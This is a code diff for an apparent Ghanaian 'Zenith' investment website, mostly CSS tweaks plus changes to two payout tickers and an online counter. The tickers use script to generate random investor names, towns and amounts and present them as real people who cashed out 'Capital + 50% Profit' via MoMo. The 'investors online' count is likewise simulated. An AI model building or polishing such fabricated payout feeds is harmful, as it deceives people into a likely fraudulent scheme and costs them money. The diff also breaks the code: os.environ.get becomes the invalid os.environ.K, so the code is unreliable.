@@ -173,16 +173,16 @@ ZENITH_ALERTS_TOP_HTML = """
 <style>
     #zenithAlertsBanner {
         background: linear-gradient(135deg, #0b130b, #132e13);
-        border-bottom: 2px solid #00ff66; color: #fff; padding: 10px 15px;
-        margin-bottom: 20px; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        border-bottom: 2px solid #00ff66; color: #fff; padding: 12px 15px;
+        margin-bottom: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         font-family: Arial, sans-serif; overflow: hidden; position: relative;
     }
-    .alerts-header { font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 4px; display: flex; justify-content: space-between; }
+    .alerts-header { font-size: 11px; color: #00ff66; font-weight: bold; text-transform: uppercase; margin-bottom: 6px; display: flex; justify-content: space-between; }
     .marquee-container { overflow: hidden; white-space: nowrap; width: 100%; position: relative; }
-    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 28s linear infinite; font-size: 13px; color: #fff; }
+    .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 32s linear infinite; font-size: 13px; color: #fff; line-height: 1.5; }
     .marquee-text b { color: #facc15; }
     @keyframes marquee { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
-    .live-online-counter { background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }
+    .live-online-counter { background: #064e3b; color: #34d399; padding: 6px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }
 </style>
 <div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
 <div id="zenithAlertsBanner">
@@ -210,13 +210,15 @@ ZENITH_ALERTS_TOP_HTML = """
             const town = towns[Math.floor(Math.random() * towns.length)];
             const base = roundInvestments[Math.floor(Math.random() * roundInvestments.length)];
             const total = base * 1.5;
-            messages.push(`🟢 <b>${name}</b> (${town}) successfully cashed out Capital + 50% Profit = <b>GHs ${total.toLocaleString()}</b> via MoMo!`);
+            // Structured into 3 clear horizontal visual lines for name, location, and payout details
+            messages.text = `🟢 <b>Investor:</b> ${name}<br>📍 <b>Location:</b> ${town}<br>💰 <b>Cashed Out (Capital + 50% Profit):</b> GHs ${total.toLocaleString()} via MoMo`;
+            messages.push(`🟢 <b>Investor:</b> ${name}<br>📍 <b>Location:</b> ${town}<br>💰 <b>Cashed Out (Capital + 50% Profit):</b> GHs ${total.toLocaleString()} via MoMo`);
         }
         const el = document.getElementById('alertsText');
-        if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
+        if (el) el.innerHTML = messages.join("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&bull;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;");
     }
     generateTickerMessages();
-    setInterval(generateTickerMessages, 22000);
+    setInterval(generateTickerMessages, 25000);
 
     let currentOnline = 850;
     function updateOnlineCounter() {
@@ -535,7 +537,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
         .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
-        .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
+        .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; line-height: 1.4; }
         .side-ticker-item b { color: #facc15; }
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
     </style>
@@ -706,11 +708,11 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             
             const item = document.createElement('div');
             item.className = 'side-ticker-item';
-            item.innerHTML = `<b>${name}</b> (${town})<br>Cashed out <b>GHs ${amt.toLocaleString()}</b> via MoMo`;
+            item.innerHTML = `👤 <b>${name}</b><br>📍 <b>Town:</b> ${town}<br>💰 <b>Cashed Out:</b> GHs ${amt.toLocaleString()}`;
             list.prepend(item);
             if (list.children.length > 5) list.lastChild.remove();
         }
-        setInterval(addSideTickerItem, 5000);
+        setInterval(addSideTickerItem, 6000);
         addSideTickerItem();
     </script>
 </body>
@@ -1450,5 +1452,5 @@ def uploaded_file(filename):
 
 
 if __name__ == "__main__":
-  port = int(os.environ.get("PORT", 5001))
+  port = int(os.environ.K("PORT", 5001))
   app.run(host="0.0.0.0", port=port)
